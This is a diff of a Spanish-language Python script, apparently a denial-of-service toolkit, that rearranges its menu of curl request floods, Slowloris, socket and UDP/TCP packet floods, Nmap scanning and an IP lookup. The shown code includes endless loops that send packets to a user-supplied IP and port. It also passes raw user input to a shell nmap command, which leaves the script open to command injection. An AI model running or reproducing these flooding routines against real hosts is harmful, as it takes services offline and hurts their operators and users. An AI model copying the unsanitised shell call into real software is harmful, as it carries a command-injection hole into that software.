@@ -52,7 +52,10 @@ print(Fore.BLUE+"██║░░██║██████╔╝░░░██
 print(Fore.BLUE+"╚═╝░░╚═╝╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝░╚════╝ "+Fore.RED+" ╚═╝░░╚══╝╚══════╝░░░╚═╝░░░")
 print("~~~~~~~~~~~~~~~~~~~~~~~~~Created by:"+Creator+Fore.RED+"~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
 print("~~~~~~~~~~~~~~~~~~~~~~~~~ Version: "+Version+Fore.RED+" ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
-method=input(Fore.GREEN+"\n[1]"+Fore.WHITE+"Peticiones CURL"+Fore.GREEN+"\n[2]"+Fore.WHITE+"Slowloris"+Fore.GREEN+"\n[3]"+Fore.WHITE+"Socket"+Fore.GREEN+"\n[4]"+Fore.WHITE+"Escaneo con Namp"+Fore.GREEN+"\n[5]"+Fore.WHITE+"Ver mi IP"+Fore.GREEN+"\n[6]"+Fore.WHITE+"UDP/TCP flood\n~~~~"+Fore.GREEN+"> "+Fore.WHITE+"")
+print(Fore.WHITE+"------------------- DoS-Denial of Service  ------------------------")
+print(Fore.GREEN+"[1]"+Fore.WHITE+"Peticiones curl"+Fore.GREEN+"\n[2]"+Fore.WHITE+"Slowloris"+Fore.GREEN+"\n[3]"+Fore.WHITE+"socket"+Fore.GREEN+"\n[4]"+Fore.WHITE+"UDP/TCP")
+print("-------------------------------- Ip tools  -------------------------")
+method=input(Fore.GREEN+"[5]"+Fore.WHITE+"Escaneo con Nmap"+Fore.GREEN+"\n[6]"+Fore.WHITE+"Mi ip"+Fore.WHITE+"\n~~~~> ")
 if method == "1":
     host=input("Ingresa el IP, Host\n~~~~> ")
     treads=input("Ingresa el numero de solicitudes, default("+Fore.BLUE+"500"+Fore.WHITE+")\n~~~~> ")
@@ -113,23 +116,8 @@ elif method == "3":
         print(Fore.WHITE+"Enviando paquetes a "+Fore.YELLOW+ip+Fore.WHITE+" a travez del puerto: "+Fore.BLUE+port)
         while True:
             sock.sendto(bytes, (ip,int(port)))
-            
+
 elif method == "4":
-    print("Escaneo con Nmap")
-    time.sleep(2)
-    system("clear")
-    Nmap_banner()
-    ip=input(Fore.WHITE+"Ingresa la direccion IPv4\n~~~~"+Fore.GREEN+"> ")
-    system("nmap -Pn "+ip)
-            
-            
-            
-elif method == "5":
-    print("Tu direccion IP es:")
-    time.sleep(1)
-    system("curl ifconfig.me")
-    
-elif method == "6":
     system("clear")
     
     banner_udp_flood()
@@ -143,17 +131,30 @@ elif method == "6":
             sock.connect((ip,int(port)))
             sock.send(bytes)
             
-            
-            
-            
-    for x in range(time):
-        number_package=x + 1
-        print(Fore.BLUE+"Enviando paquete #"+str(number_package)+" de "+str(time)+" paquetes"+Fore.YELLOW+" UDP "+Fore.WHITE+"a "+Fore.GREEN+ip+Fore.BLUE+" a treves del puerto "+Fore.YELLOW+str(port)+Fore.GREEN+" [✓]")
-        sock.connect((ip,int(port)))
-        sock.send(bytes)
-        if number_package == time:
-            print("Exelente, todos los paquetes fueron enviados con exitos ;)")
+    else:
+        for x in range(time):
+            number_package=x + 1
+            print(Fore.BLUE+"Enviando paquete #"+str(number_package)+" de "+str(time)+" paquetes"+Fore.YELLOW+" UDP "+Fore.WHITE+"a "+Fore.GREEN+ip+Fore.BLUE+" a treves del puerto "+Fore.YELLOW+str(port)+Fore.GREEN+" [✓]")
+            sock.connect((ip,int(port)))
+            sock.send(bytes)
+            if number_package == time:
+                print("Exelente, todos los paquetes fueron enviados con exitos ;)")
         
+elif method == "5":
+    print("Escaneo con Nmap")
+    time.sleep(2)
+    system("clear")
+    Nmap_banner()
+    ip=input(Fore.WHITE+"Ingresa la direccion IPv4\n~~~~"+Fore.GREEN+"> ")
+    system("nmap -Pn "+ip)
+            
+            
+            
+elif method == "6":
+    print("Tu direccion IP es:")
+    time.sleep(1)
+    system("curl ifconfig.me")
+    
     
 else:
     for i in range(100):
